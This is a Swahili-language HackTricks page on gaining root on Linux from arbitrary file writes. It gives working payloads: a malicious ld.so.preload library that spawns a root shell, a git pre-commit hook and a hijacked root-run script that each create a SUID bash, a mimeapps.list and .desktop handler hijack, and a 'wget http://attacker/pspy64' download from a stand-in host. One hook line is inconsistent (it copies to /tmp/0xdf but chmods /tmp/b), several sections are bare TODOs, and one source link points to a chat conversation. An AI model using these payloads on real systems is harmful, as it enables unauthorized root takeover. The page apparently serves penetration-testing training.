# Kuandika Faili yeyote kwa root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Faili hii inafanya kazi kama variable ya mazingira **`LD_PRELOAD`**, lakini pia inafanya kazi kwenye **SUID binaries**.\
Ikiwa unaweza kuunda au kuibadilisha, unaweza kuongeza tu **njia ya maktaba itakayopakiwa** na kila binary itakayotekelezwa.

Kwa mfano: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) ni **scripts** zinazofanya **run** kwenye **events** mbalimbali katika git repository kama wakati commit inaundwa, merge... Kwa hivyo ikiwa **privileged script or user** anafanya vitendo hivi mara kwa mara na inawezekana **write in the `.git` folder**, hii inaweza kutumika kwa **privesc**.

Kwa mfano, inawezekana **generate a script** katika git repo katika **`.git/hooks`** ili itekelezwe kila inapoundwa commit mpya:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Faili za Muda

TODO

### Faili za Service & Socket

TODO

### binfmt_misc

Faili iliyopo katika `/proc/sys/fs/binfmt_misc` inaonyesha binary gani inapaswa kutekeleza aina gani ya faili. TODO: angalia mahitaji ya kutumia vibaya hili ili kuendesha rev shell wakati aina ya faili ya kawaida imefunguliwa.

### Kuandika upya schema handlers (like http: or https:)

Mshambuliaji mwenye ruhusa za kuandika kwenye directories za usanidi za mwanaathiriwa anaweza kwa urahisi kubadilisha au kuunda files zinazobadilisha tabia ya system, zikisababisha unintended code execution. Kwa kuhariri faili `$HOME/.config/mimeapps.list` ili kuonyesha HTTP na HTTPS URL handlers kwa faili hatari (kwa mfano, kuweka `x-scheme-handler/http=evil.desktop`), mshambuliaji anahakikisha kuwa **kubofya kiungo chochote cha http au https kunasababisha msimbo ulioainishwa katika faili `evil.desktop` hiyo**. Kwa mfano, baada ya kuweka msimbo ufuatao hatari katika `evil.desktop` katika `$HOME/.local/share/applications`, bofya yoyote ya URL ya nje inafanya amri iliyowekwa ndani:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Kwa taarifa zaidi angalia [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) ambapo ilitumiwa kufaida udhaifu wa kweli.

### Root akiendesha scripts/binaries zinazoweza kuandikwa na mtumiaji

Ikiwa workflow yenye mamlaka inaendesha kitu kama `/bin/sh /home/username/.../script` (au binary yoyote ndani ya directory inayomilikiwa na mtumiaji asiye na ruhusa), unaweza kuiteka:

- **Gundua utekelezaji:** fuatilia michakato kwa kutumia [pspy](https://github.com/DominicBreuker/pspy) ili kumkamata root akitumia njia zinazodhibitiwa na mtumiaji:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** hakikisha kwamba faili lengwa na saraka yake vinamilikiwa/vinaweza kuandikwa na mtumiaji wako.
- **Hijack the target:** tengeneza backup ya binary/script ya asili na weka payload inayounda SUID shell (au tendo lingine lolote la root), kisha rejesha ruhusa:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (kwa mfano, kubonyeza kitufe cha UI kinachozalisha helper). Wakati root anorudia ku-execute hijacked path, chukua escalated shell kwa kutumia `./rootshell -p`.

## Marejeo

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)

{{#include ../../banners/hacktricks-training.md}}
